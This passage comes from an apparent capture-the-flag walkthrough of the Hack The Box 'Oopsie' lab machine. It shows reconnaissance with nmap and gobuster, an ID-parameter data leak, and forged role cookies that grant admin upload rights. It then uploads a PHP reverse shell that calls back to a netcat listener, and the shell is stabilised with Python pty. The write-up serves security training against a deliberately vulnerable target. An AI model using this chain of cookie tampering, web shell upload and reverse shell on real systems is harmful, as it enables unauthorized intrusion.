<strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>With what kind of tool can intercept web traffic?</em></p><p>A quick <strong>connection</strong> check,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping <span class=nv>$rhost</span> -c <span class=m>4</span>
</span></span><span class=line><span class=cl>PING 10.129.95.191 <span class=o>(</span>10.129.95.191<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.95.191: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.6 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.95.191: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>11.0 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.95.191: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.6 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.95.191: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>11.1 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.95.191 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 10.586/10.835/11.139/0.235 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>followed by the usual <em><strong>nmap</strong></em> scan</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -sC -sV <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-12 09:44 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.95.191
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.063s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 61e43fd41ee2b2f10d3ced36283667c7 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 241da417d4e32a9c905c30588f60778d <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 78030eb4a1afe5c2f98d29053e29c9f2 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Welcome
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 8.33 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p><strong>determines</strong> that we have <strong>two</strong> <strong>open</strong> ports: port 22 and port 80. <strong>Building</strong> on these <strong>results</strong>, we try to get a <strong>fingerprint</strong> on the running web server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ whatweb <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>http://10.129.95.191 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.29<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, Email<span class=o>[</span>admin@megacorp.com<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.129.95.191<span class=o>]</span>, Script, Title<span class=o>[</span>Welcome<span class=o>]</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>Putting the <strong>collected pieces</strong> together, this is the <strong>initial</strong> picture we get about our <strong>target</strong>:</p><ul><li>target is running Linux - Ubuntu &ndash; probably Ubuntu 18.04</li><li>ssh is enabled &ndash; version: openssh (1:7.6p1-4ubuntu0.3)</li><li>target is serving a webpage &ndash; web server version Apache httpd 2.4.29</li><li>admin email:admin@megacorp.com</li><li>found hostname: megacorp.com</li></ul><p>And haven&rsquo;s even started out on our webpage. Let&rsquo;s correct that. First we try <strong>accessing</strong> it with a <strong>browser</strong>. It looks like an automobile website.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/oopsie/screenshots/webpage.png alt=webpage title=webpage></p><p><strong>Looking around</strong> a bit we notice that none of the tabs seems to be working. All of them simply redirect us to - <em>http://$rhost/#</em> - which seems to be identical to the landing page.</p><p>Also, <em><strong>Wappalyzer</strong></em> has identified the <strong>front scripts</strong> as <em>Font Awesome</em>. We take a note of it, maybe it can lead somewhere.</p><p>Otherwise, since nothing else pops up at this first look, we continue with <em><strong>dir busting</strong></em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ gobuster dir -u http://<span class=nv>$rhost</span>/ -w /usr/share/wordlists/dirb/common.txt 
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.129.95.191/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/12 09:48:18 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 312<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.95.191/css/<span class=o>]</span>
</span></span><span class=line><span class=cl>/fonts                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 314<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.95.191/fonts/<span class=o>]</span>
</span></span><span class=line><span class=cl>/images               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 315<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.95.191/images/<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 10932<span class=o>]</span>                                 
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 311<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.95.191/js/<span class=o>]</span>    
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>                                   
</span></span><span class=line><span class=cl>/themes               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 315<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.95.191/themes/<span class=o>]</span>
</span></span><span class=line><span class=cl>/uploads              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 316<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.95.191/uploads/<span class=o>]</span>
</span></span><span class=line><span class=cl>                                                                                   
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/12 09:48:24 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Well, none of them are really accessible except the landing page, so nothing interesting here. We keep on looking.</p><p>As for the answer, a quick <strong>internet search</strong> should do it.</p><blockquote><p>proxy</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>What is the path to the directory on the webserver that returns a login page?</em></p><p>Taking a quick look at the <strong>page source code</strong> that belongs to the main page seems to be rewarding.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/oopsie/screenshots/webpage-source-code.png alt=webpage-source-code title=webpage-source-code></p><p>At the end of the code, there is a <strong>script</strong> that names an interesting <strong>source location</strong>:</p><pre tabindex=0><code class=language-javascrip data-lang=javascrip>...
&lt;script src=&#34;/cdn-cgi/login/script.js&#34;&gt;&lt;/script&gt;
...
</code></pre><p>Following this mention, we head over to - <em>http://$rhost/cdn-cgi/login/</em> - where we are welcomed with a <strong>login page</strong>.</p><p>It is important to take note of the <em>Login as Guest</em> <strong>option</strong>. Once we click on it, we are redirected to - <em>http://$rhost/cdn-cgi/login/admin.php</em> -.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/oopsie/screenshots/webpage-post-log-on-guest.png alt=webpage-post-log-on-guest title=webpage-post-log-on-guest></p><blockquote><p>/cdn-cgi/login</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What can be modified in Firefox to get access to the upload page?</em></p><p>There are a few <strong>interesting</strong> things we might notice once we start goofing around:</p><ul><li>there is an interesting <em>Uploads</em> tab which is currently not accessible (<em>&ldquo;This action require super admin rights.&rdquo;</em>)</li><li>it is possible to <strong>leak</strong> <strong>potentially confidential</strong> information by simply modifying the <strong>url parameters</strong> in the tabs <em>Account</em>, <em>Branding</em> and <em>Clients</em></li></ul><p>Playing around with the <strong>url parameters</strong> and setting the <strong>id</strong> parameter to <strong>1</strong> under the <em>Account</em> <strong>tab</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&amp;id=1
</span></span></span></code></pre></div><p><strong>reveals</strong> something very interesting.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/oopsie/screenshots/webpage-admin-access-id.png alt=webpage-admin-access-id title=webpage-admin-access-id></p><p>Taking an other look at the <em>Uploads</em> page, but this time using the <em><strong>Web Developer Tools</strong></em> (<em><strong>Firefox</strong></em> built-in tool) we notice the <strong>two</strong> <em><strong>cookies</strong></em> that are currently set.</p><table><thead><tr><th>cookie #1</th><th></th></tr></thead><tbody><tr><td><em>Name</em></td><td style=text-align:left>role</td></tr><tr><td><em>Value</em></td><td style=text-align:left>guest</td></tr></tbody></table><table><thead><tr><th>cookie #2</th><th></th></tr></thead><tbody><tr><td><em>Name</em></td><td style=text-align:left>user</td></tr><tr><td><em>Value</em></td><td style=text-align:left>2233</td></tr></tbody></table><p>This is probably how the <strong>website</strong> decides if we are allowed to access the <em>Uploads</em> tab or not.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/oopsie/screenshots/cookies-default.png alt=cookies-default title=cookies-default></p><blockquote><p>cookie</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>What is the access ID of the admin user?</em></p><p>Could we maybe simply <strong>modify</strong> them? Maybe use some of the <strong>leaked information</strong> we got when we accessed the <em>Account</em> tab? Let&rsquo;s try and <strong>modify</strong> our <strong>cookies</strong>:</p><table><thead><tr><th>cookie #1</th><th></th></tr></thead><tbody><tr><td><em>Name</em></td><td style=text-align:left>role</td></tr><tr><td><em>Value</em></td><td style=text-align:left>admin</td></tr></tbody></table><table><thead><tr><th>cookie #2</th><th></th></tr></thead><tbody><tr><td><em>Name</em></td><td style=text-align:left>user</td></tr><tr><td><em>Value</em></td><td style=text-align:left>34322</td></tr></tbody></table><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/oopsie/screenshots/cookies-modified.png alt=cookies-modified title=cookies-modified></p><p>Once we <strong>refresh</strong> the page, we are welcomed with an <strong>upload window</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/oopsie/screenshots/cookies-modified-success.png alt=cookies-modified-success title=cookies-modified-success></p><blockquote><p>34322</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>On uploading a file, what directory does that file appear in on the server?</em></p><p>Since an option to <strong>include</strong> our <strong>own files</strong> on the server is found, let&rsquo;s strive for a <strong>reverse shell</strong>.</p><p>Using <em><strong>Wappalyzer</strong></em> on the current webpage reports <em><strong>php</strong></em> as the <strong>programming language</strong>. Therefore, it&rsquo;s time to go and look for a <strong>reverse shell</strong> written in <em><strong>php</strong></em>.</p><p>On the <em><strong>pwnbox</strong></em> we do not have to look that far, since there is one already downloaded for us. We <strong>copy</strong> it to our current working directory, <strong>rename</strong> it (so that it&rsquo;s not so noticeable) and we are <strong>almost ready</strong> to go.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll /usr/share/webshells/php/php-reverse-shell.php 
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root 5.4K Jan  <span class=m>8</span>  <span class=m>2022</span> /usr/share/webshells/php/php-reverse-shell.php
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cp /usr/share/webshells/php/php-reverse-shell.php ./test.php
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 8.0K
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> htb-bluewalle htb-bluewalle 5.4K May <span class=m>12</span> 11:01 test.php
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>All that&rsquo;s left is to <strong>customize</strong> it for our use. <strong>Modifying</strong> these two lines should do it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># test.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>;</span>  <span class=c1>// CHANGE THIS
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$port</span> <span class=o>=</span> <span class=mi>1234</span><span class=p>;</span>       <span class=c1>// CHANGE THIS
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># new test.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=s1>&#39;$lhost&#39;</span><span class=p>;</span>  <span class=c1>// CHANGED - look up your lhost ip --&gt; &#34;ip a | grep tun 0&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$port</span> <span class=o>=</span> <span class=mi>4444</span><span class=p>;</span>    <span class=c1>// CHANGED - arbitrary port --&gt; best to pick something above 1024
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>...</span>
</span></span></code></pre></div><p>There is a nice <strong>confirmation</strong> we get once we upload it.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/oopsie/screenshots/upload-confirmation.png alt=upload-confirmation title=upload-confirmation></p><p>It&rsquo;s time to see if it actually runs. But for that, we still need a <em><strong>netcat listener</strong></em> to <strong>catch</strong> it when it tries <strong>connecting back</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># new terminal on lhost</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span></code></pre></div><p>With everything <strong>set up</strong>, it&rsquo;s time to finally <strong>run</strong> our <strong>reverse shell</strong>. But where can we find it? Looking at our <em><strong>dir busting</strong></em> results from TASK1, our assumption is that it landed somewhere in the <em>/uploads</em> directory. So we try <strong>accessing</strong> it in the browser.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/oopsie/screenshots/accessing-rev-shell.png alt=accessing-rev-shell title=accessing-rev-shell></p><p>Nothing really seems to be happening, except that the page appears to be loading&mldr; But if we check our <em><strong>netcat listener</strong></em>, we will notice a <em><strong>reverse shell</strong></em> connection from our <strong>target</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.95.191.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.95.191:45114.
</span></span><span class=line><span class=cl>Linux oopsie 4.15.0-76-generic <span class=c1>#86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl> 10:31:34 up  1:53,  <span class=m>0</span> users,  load average: 0.00, 0.00, 0.00
</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>/bin/sh: 0: can<span class=err>&#39;</span>t access tty<span class=p>;</span> job control turned off
</span></span><span class=line><span class=cl>$
</span></span></code></pre></div><blockquote><p>/uploads</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>What is the file that contains the password that is shared with the robert user?</em></p><p>One nice way to <strong>stabilize</strong> our <em><strong>netcat</strong></em> <strong>reverse shell</strong> is by going through the following motions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Netcat Shell Stabilisation</span>
</span></span><span class=line><span class=cl>python -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># or</span>
</span></span><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl><span class=o>[</span>CTRL+Z<span class=o>]</span> to background the process
</span></span><span class=line><span class=cl><span class=c1># On lhost (turn off our own terminal echo)</span>
</span></span><span class=line><span class=cl>stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span></code></pre></div><p>Since only <em><strong>python3</strong></em> is installed on the <strong>target</strong>, we go with that option. Trying it get&rsquo;s us a <strong>nice</strong>, <strong>stable</strong> and <strong>clear</strong> shell connection.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-ab85cpsply<span class=o>]</span>─<span class=o>[</span>~/oopsie<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.95.191.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.95.191:45114.
